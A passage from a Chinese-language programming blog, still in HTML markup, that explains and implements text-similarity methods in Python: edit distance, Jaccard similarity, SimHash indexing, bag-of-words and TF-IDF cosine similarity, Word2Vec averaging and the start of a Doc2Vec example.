len(s2.strip())<br>    <span class="hljs-comment"># 创建一张表格记录所有子问题的答案</span><br>    dp = [[<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(n+<span class="hljs-number">1</span>)] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(m+<span class="hljs-number">1</span>)] <br>    <span class="hljs-comment"># 从上往下填充DP表格</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(m+<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(n+<span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">if</span> i == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> j == <span class="hljs-number">0</span>:<br>                dp[i][j] = max(i, j)<br>            <span class="hljs-comment"># 如果两个字符串结尾字母相同，距离不变</span><br>            <span class="hljs-keyword">elif</span> s1[i<span class="hljs-number">-1</span>] == s2[j<span class="hljs-number">-1</span>]:<br>                dp[i][j] = dp[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>]<br>            <span class="hljs-comment"># 如果结尾字母不同，那我们就需要考虑三种情况，取最小的编辑距离</span><br>            <span class="hljs-comment"># 替换，添加，删除</span><br>            <span class="hljs-keyword">else</span>:<br>                dp[i][j] = <span class="hljs-number">1</span> + min(dp[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>], dp[i][j<span class="hljs-number">-1</span>], dp[i<span class="hljs-number">-1</span>][j])<br>    <br>    <span class="hljs-keyword">return</span> dp[m][n]<br></code></pre></div></td></tr></table></figure><ol start="3" type="1"><li>Jaccard Similarity</li></ol><p>​给定两句话，把两句话中出现的单词取交集和并集，交集和并集的大小之商即为JaccardSimilarity。</p><p>​ JaccardSimilarity只考虑单词出现与否，忽略每个单词的含义，忽略单词的顺序，没有考虑单词出现的次数。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">jaccard_sim</span><span class="hljs-params">(s1, s2)</span>:</span><br>    <span class="hljs-string">"""交并比"""</span><br>    a = set(s1.strip().split())<br>    b = set(s2.strip().split())<br>    c = a.intersection(b)<br>    <span class="hljs-keyword">return</span> float(len(c) / (len(a) + len(b) - len(c)))<br></code></pre></div></td></tr></table></figure><h2><span id="基于文本特征的相似度计算方法">基于文本特征的相似度计算方法</span></h2><h3><span id="simhash">SimHash</span></h3><ol type="1"><li>选择一个hashsize，例如32</li><li>V = [0] * 32</li><li>把一段text变成features (shingles)</li><li>把每个feature都hash成32位</li><li>对于每个hash的每个位置，如果位置上是1就把V[i]加1，如果不是就把V[i]减1</li><li>最后，如果V[i]&gt;0就设为1，否则设为0，得到的V就是我们想要的simhash值<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">import</span> numbers<br><span class="hljs-keyword">import</span> collections<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> groupby<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_hashfunc</span><span class="hljs-params">(x)</span>:</span> <span class="hljs-comment"># 使用的hash函数</span><br>    <span class="hljs-keyword">return</span> int(hashlib.md5(x).hexdigest(), <span class="hljs-number">16</span>)<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Simhash</span><span class="hljs-params">(object)</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self,</span></span><br><span class="hljs-function"><span class="hljs-params">                 value,</span></span><br><span class="hljs-function"><span class="hljs-params">                 f=<span class="hljs-number">64</span>,</span></span><br><span class="hljs-function"><span class="hljs-params">                 reg=<span class="hljs-string">r'[\w\u4e00-\u9fcc]+'</span>,</span></span><br><span class="hljs-function"><span class="hljs-params">                 hashfunc=None,</span></span><br><span class="hljs-function"><span class="hljs-params">                 log=None)</span>:</span><br>        <span class="hljs-string">"""</span><br><span class="hljs-string">        `f` is the dimensions of fingerprints</span><br><span class="hljs-string"></span><br><span class="hljs-string">        `reg` is meaningful only when `value` is str and describes</span><br><span class="hljs-string">        what is considered to be a letter inside parsed string. Regexp</span><br><span class="hljs-string">        object can also be specified (some attempt to handle any letters</span><br><span class="hljs-string">        is to specify reg=re.compile(r'\w', re.UNICODE))</span><br><span class="hljs-string"></span><br><span class="hljs-string">        `hashfunc` accepts a utf-8 encoded string and returns a unsigned</span><br><span class="hljs-string">        integer in at least `f` bits.</span><br><span class="hljs-string">        """</span><br><br>        self.f = f<br>        self.reg = reg<br>        self.value = <span class="hljs-literal">None</span><br><br>        <span class="hljs-keyword">if</span> hashfunc <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            self.hashfunc = _hashfunc<br>        <span class="hljs-keyword">else</span>:<br>            self.hashfunc = hashfunc<br><br>        <span class="hljs-keyword">if</span> log <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            self.log = logging.getLogger(<span class="hljs-string">"simhash"</span>)<br>        <span class="hljs-keyword">else</span>:<br>            self.log = log<br><br>        <span class="hljs-keyword">if</span> isinstance(value, Simhash):<br>            self.value = value.value<br>        <span class="hljs-keyword">elif</span> isinstance(value, str):<br>            <span class="hljs-comment">#  print("build by text")</span><br>            self.build_by_text(str(value))<br>        <span class="hljs-keyword">elif</span> isinstance(value, collections.Iterable):<br>            self.build_by_features(value)<br>        <span class="hljs-keyword">elif</span> isinstance(value, numbers.Integral):<br>            self.value = value<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">'Bad parameter with type &#123;&#125;'</span>.format(type(value)))<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__eq__</span><span class="hljs-params">(self, other)</span>:</span><br>        <span class="hljs-string">"""</span><br><span class="hljs-string">        Compare two simhashes by their value.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        :param Simhash other: The Simhash object to compare to</span><br><span class="hljs-string">        """</span><br>        <span class="hljs-keyword">return</span> self.value == other.value<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_slide</span><span class="hljs-params">(self, content, width=<span class="hljs-number">4</span>)</span>:</span><br>        <span class="hljs-keyword">return</span> [<br>            content[i:i + width]<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(max(len(content) - width + <span class="hljs-number">1</span>, <span class="hljs-number">1</span>))<br>        ]<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_tokenize</span><span class="hljs-params">(self, content)</span>:</span><br>        content = content.lower()<br>        content = <span class="hljs-string">''</span>.join(re.findall(self.reg, content))<br>        ans = self._slide(content)<br>        <span class="hljs-keyword">return</span> ans<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_by_text</span><span class="hljs-params">(self, content)</span>:</span><br>        features = self._tokenize(content)<br>        features = &#123;k: sum(<span class="hljs-number">1</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> g) <span class="hljs-keyword">for</span> k, g <span class="hljs-keyword">in</span> groupby(sorted(features))&#125;<br>        <span class="hljs-keyword">return</span> self.build_by_features(features)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_by_features</span><span class="hljs-params">(self, features)</span>:</span><br>        <span class="hljs-string">"""</span><br><span class="hljs-string">        核心方法</span><br><span class="hljs-string">        `features` might be a list of unweighted tokens (a weight of 1</span><br><span class="hljs-string">                   will be assumed), a list of (token, weight) tuples or</span><br><span class="hljs-string">                   a token -&gt; weight dict.</span><br><span class="hljs-string">        """</span><br>        v = [<span class="hljs-number">0</span>] * self.f  <span class="hljs-comment"># 初始化 [0,0,0,...]</span><br>        masks = [<span class="hljs-number">1</span> &lt;&lt; i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(self.f)]  <span class="hljs-comment"># 二进制下[1000, 0100, 0010, ...]</span><br>        <br>        <span class="hljs-keyword">if</span> isinstance(features, dict):<br>            features = features.items()<br>        <br>        <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> features:<br>            <span class="hljs-keyword">if</span> isinstance(f, str):<br>                h = self.hashfunc(f.encode(<span class="hljs-string">'utf-8'</span>))  <span class="hljs-comment"># hash成32位</span><br>                w = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">assert</span> isinstance(f, collections.Iterable)<br>                h = self.hashfunc(f[<span class="hljs-number">0</span>].encode(<span class="hljs-string">'utf-8'</span>))<br>                w = f[<span class="hljs-number">1</span>]<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(self.f):<br>                <span class="hljs-comment"># mask位置为1，则vi加上w，否则减去w</span><br>                v[i] += w <span class="hljs-keyword">if</span> h &amp; masks[i] <span class="hljs-keyword">else</span> -w<br>        <br>        ans = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(self.f):<br>            <span class="hljs-keyword">if</span> v[i] &gt; <span class="hljs-number">0</span>:  <span class="hljs-comment"># 如果大于0，就把那一位变成1</span><br>                ans |= masks[i]<br>        self.value = ans<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">distance</span><span class="hljs-params">(self, another)</span>:</span><br>        <span class="hljs-string">"""计算两个vector有多少个位置不一样"""</span><br>        <span class="hljs-keyword">assert</span> self.f == another.f<br>        x = (self.value ^ another.value) &amp; ((<span class="hljs-number">1</span> &lt;&lt; self.f) - <span class="hljs-number">1</span>)  <span class="hljs-comment"># (1 &lt;&lt; self.f) - 1: self.f个位的1</span><br>        ans = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> x: <span class="hljs-comment"># bin(x)不全为0，即x非0</span><br>            ans += <span class="hljs-number">1</span>  <br>            x &amp;= x - <span class="hljs-number">1</span>   <span class="hljs-comment"># bin计算，每算一次，低位的第一个1变为0</span><br>        <span class="hljs-keyword">return</span> ans<br></code></pre></div></td></tr></table></figure></li></ol><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SimhashIndex</span><span class="hljs-params">(object)</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, objs, f=<span class="hljs-number">64</span>, k=<span class="hljs-number">2</span>, log=None)</span>:</span><br>        <span class="hljs-string">"""</span><br><span class="hljs-string">        使用Simhash进行相似字符串检索</span><br><span class="hljs-string">        `objs` is a list of (obj_id, simhash)</span><br><span class="hljs-string">        obj_id is a string, simhash is an instance of Simhash</span><br><span class="hljs-string">        `f` is the same with the one for Simhash</span><br><span class="hljs-string">        `k` is the tolerance</span><br><span class="hljs-string">        """</span><br>        self.k = k<br>        self.f = f<br>        count = len(objs)<br><br>        <span class="hljs-keyword">if</span> log <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            self.log = logging.getLogger(<span class="hljs-string">"simhash"</span>)<br>        <span class="hljs-keyword">else</span>:<br>            self.log = log<br><br>        self.log.info(<span class="hljs-string">'Initializing %s data.'</span>, count)<br><br>        self.bucket = collections.defaultdict(set)<br><br>        <span class="hljs-keyword">for</span> i, q <span class="hljs-keyword">in</span> enumerate(objs):<br>            <span class="hljs-keyword">if</span> i % <span class="hljs-number">10000</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> i == count - <span class="hljs-number">1</span>:<br>                self.log.info(<span class="hljs-string">'%s/%s'</span>, i + <span class="hljs-number">1</span>, count)<br>            self.add(*q)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_near_dups</span><span class="hljs-params">(self, simhash)</span>:</span><br>        <span class="hljs-string">"""</span><br><span class="hljs-string">        `simhash` is an instance of Simhash</span><br><span class="hljs-string">        return a list of obj_id, which is in type of str</span><br><span class="hljs-string">        """</span><br>        <span class="hljs-keyword">assert</span> simhash.f == self.f<br><br>        ans = set()<br><br>        <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> self.get_keys(simhash):<br>            dups = self.bucket[key]<br>            self.log.debug(<span class="hljs-string">'key:%s'</span>, key)<br>            <span class="hljs-keyword">if</span> len(dups) &gt; <span class="hljs-number">200</span>:<br>                self.log.warning(<span class="hljs-string">'Big bucket found. key:%s, len:%s'</span>, key,<br>                                 len(dups))<br><br>            <span class="hljs-keyword">for</span> dup <span class="hljs-keyword">in</span> dups:<br>                sim2, obj_id = dup.split(<span class="hljs-string">','</span>, <span class="hljs-number">1</span>)<br>                sim2 = Simhash(int(sim2, <span class="hljs-number">16</span>), self.f)<br><br>                d = simhash.distance(sim2)<br>                <span class="hljs-keyword">if</span> d &lt;= self.k:<br>                    ans.add(obj_id)<br>        <span class="hljs-keyword">return</span> list(ans)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(self, obj_id, simhash)</span>:</span><br>        <span class="hljs-string">"""</span><br><span class="hljs-string">        `obj_id` is a string</span><br><span class="hljs-string">        `simhash` is an instance of Simhash</span><br><span class="hljs-string">        """</span><br>        <span class="hljs-keyword">assert</span> simhash.f == self.f<br><br>        <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> self.get_keys(simhash):<br>            v = <span class="hljs-string">'%x,%s'</span> % (simhash.value, obj_id)<br>            self.bucket[key].add(v)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">(self, obj_id, simhash)</span>:</span><br>        <span class="hljs-string">"""</span><br><span class="hljs-string">        `obj_id` is a string</span><br><span class="hljs-string">        `simhash` is an instance of Simhash</span><br><span class="hljs-string">        """</span><br>        <span class="hljs-keyword">assert</span> simhash.f == self.f<br><br>        <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> self.get_keys(simhash):<br>            v = <span class="hljs-string">'%x,%s'</span> % (simhash.value, obj_id)<br>            <span class="hljs-keyword">if</span> v <span class="hljs-keyword">in</span> self.bucket[key]:<br>                self.bucket[key].remove(v)<br><br><span class="hljs-meta">    @property</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">offsets</span><span class="hljs-params">(self)</span>:</span><br>        <span class="hljs-string">"""</span><br><span class="hljs-string">        You may optimize this method according to &lt;http://www.wwwconference.org/www2007/papers/paper215.pdf&gt;</span><br><span class="hljs-string">        """</span><br>        <span class="hljs-keyword">return</span> [self.f // (self.k + <span class="hljs-number">1</span>) * i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(self.k + <span class="hljs-number">1</span>)]<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_keys</span><span class="hljs-params">(self, simhash)</span>:</span><br>        <span class="hljs-keyword">for</span> i, offset <span class="hljs-keyword">in</span> enumerate(self.offsets):<br>            <span class="hljs-keyword">if</span> i == (len(self.offsets) - <span class="hljs-number">1</span>):<br>                m = <span class="hljs-number">2</span>**(self.f - offset) - <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                m = <span class="hljs-number">2</span>**(self.offsets[i + <span class="hljs-number">1</span>] - offset) - <span class="hljs-number">1</span><br>            c = simhash.value &gt;&gt; offset &amp; m<br>            <span class="hljs-keyword">yield</span> <span class="hljs-string">'%x:%x'</span> % (c, i)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bucket_size</span><span class="hljs-params">(self)</span>:</span><br>        <span class="hljs-keyword">return</span> len(self.bucket)<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">data = &#123;<br>    <span class="hljs-number">1</span>: <span class="hljs-string">u'How are you? I am fine. blar blar blar blar blar Thanks.'</span>,<br>    <span class="hljs-number">2</span>: <span class="hljs-string">u'How are you i am fine. blar blar blar blar blar Thanks.'</span>,<br>    <span class="hljs-number">3</span>: <span class="hljs-string">u'This is a simhash test'</span>,<br>&#125;<br><br><span class="hljs-comment"># 序号和hash值保存</span><br>objs = [(str(k), Simhash(v)) <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> data.items()]<br><br><span class="hljs-comment"># 建立SimhashIndex对象，`k` is the tolerance</span><br>index = SimhashIndex(objs, k=<span class="hljs-number">10</span>)<br>print(<span class="hljs-string">"相似文本Bucket数量："</span>, index.bucket_size())<br><br><span class="hljs-comment"># 输入需要查找的文本的hash值，get_near_dups获取相似文本</span><br>s1 = Simhash(<span class="hljs-string">u'How are you i am fine. blar blar blar blar blar thanks'</span>)<br>print(<span class="hljs-string">"相似文本id："</span>, index.get_near_dups(s1))<br><br><span class="hljs-comment"># 加入data文本</span><br>index.add(<span class="hljs-string">'4'</span>, s1)<br>print(<span class="hljs-string">"相似文本id："</span>, index.get_near_dups(s1))<br><br>s2 = Simhash(<span class="hljs-string">u'How are you i am fine. blar blar blar thanks'</span>)<br>index.add(<span class="hljs-string">'5'</span>, s2)<br>print(<span class="hljs-string">"相似文本id："</span>, index.get_near_dups(s1))<br></code></pre></div></td></tr></table></figure><h3><span id="cosine-similarity">Cosine Similarity</span></h3><ol type="1"><li>将文本转化为feature vectors。（bag of words或者TF-IDF）</li><li>利用feature vectors计算文本相似度</li></ol><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sklearn.feature_extraction.text <span class="hljs-keyword">import</span> CountVectorizer<br><span class="hljs-keyword">from</span> sklearn.metrics.pairwise <span class="hljs-keyword">import</span> cosine_similarity<br><br><span class="hljs-comment"># bow</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bow_cosine</span><span class="hljs-params">(s1, s2)</span>:</span><br>    <span class="hljs-string">"""返回值为ndarray类型"""</span><br>    vectorizer = CountVectorizer()    <br>    vectorizer.fit([s1, s2])      <span class="hljs-comment"># 词频统计词表</span><br>    X = vectorizer.transform([s1, s2])<br>    print(X.toarray())<br>    <span class="hljs-keyword">return</span> cosine_similarity(X[<span class="hljs-number">0</span>], X[<span class="hljs-number">1</span>])<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sklearn.feature_extraction.text <span class="hljs-keyword">import</span> TfidfVectorizer<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tfidf_cosine</span><span class="hljs-params">(s1, s2)</span>:</span><br>    vectorizer = TfidfVectorizer()<br>    vectorizer.fit([s1, s2])<br>    X = vectorizer.transform([s1, s2])<br>    print(X.toarray())<br>    <span class="hljs-keyword">return</span> cosine_similarity(X[<span class="hljs-number">0</span>], X[<span class="hljs-number">1</span>])<br></code></pre></div></td></tr></table></figure><h3><span id="word2vec">Word2Vec</span></h3><p>​ 利用句子中的单词做Word Averaging计算句子相似度。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gensim<br><span class="hljs-keyword">import</span> gensim.downloader <span class="hljs-keyword">as</span> api<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> sklearn.metrics.pairwise <span class="hljs-keyword">import</span> cosine_similarity<br><br>model = api.load(<span class="hljs-string">"glove-twitter-25"</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wordavg</span><span class="hljs-params">(model, words)</span>:</span><br>    <span class="hljs-string">"""计算句子每个词的平均词向量"""</span><br>    res = np.mean([model.get_vector(w) <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> words <span class="hljs-keyword">if</span> w <span class="hljs-keyword">in</span> model.vocab], <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> res<br><br>s1_vec = wordavg(model, s1.lower().split())<br>s2_vec = wordavg(model, s2.lower().split())<br><br>cosine_similarity(s1_vec.reshape((<span class="hljs-number">1</span>, <span class="hljs-number">-1</span>)), s2_vec.reshape((<span class="hljs-number">1</span>, <span class="hljs-number">-1</span>)))<br></code></pre></div></td></tr></table></figure><h3><span id="doc2vec">Doc2Vec</span></h3><p>​ 类似word2vec，只是在输入时加入一个全局的doc vec和wordvec一起输入，doc vec由doc id和docmatrix相乘生成。计算方法有两种，DM(DistributedMemory)算法类似CBOW，DBOW(Distributed Bag of Words)类似Skipgram(只输入doc vec预测随机抽取词的概率分布)。</p><blockquote><p>gensim官方文档：https://radimrehurek.com/gensim/models/doc2vec.html</p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gensim.models <span class="hljs-keyword">as</span> g<br><span class="hljs-keyword">from</span> gensim.corpora <span class="hljs-keyword">import</span> WikiCorpus<br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">from</span> hanziconv <span class="hljs-keyword">import</span> HanziConv<br><br>docvec_size=<span class="hljs-number">192</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TaggedWikiDocument</span><span class="hljs-params">(object)</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, wiki)</span>:</span><br>        self.wiki = wiki<br>        self.wiki.metadata = <span class="hljs-literal">True</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__iter__</span><span class="hljs-params">(self)</span>:</span><br>        <span class="hljs-keyword">import</span> jieba<br>        <span class="hljs-comment"># tags信息是word2vec没有的，辅助训练</span><br>        <span class="hljs-keyword">for</span> content, (page_id, title) <span class="hljs-keyword">in</span> self.wiki.get_texts():<br>            <span class="hljs-keyword">yield</span> g.doc2vec.LabeledSentence(words=[w <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> content <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> jieba.cut(HanziConv.toSimplified(c))], tags=[title])<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">my_function</span><span class="hljs-params">()</span>:</span><br>    zhwiki_name = <span 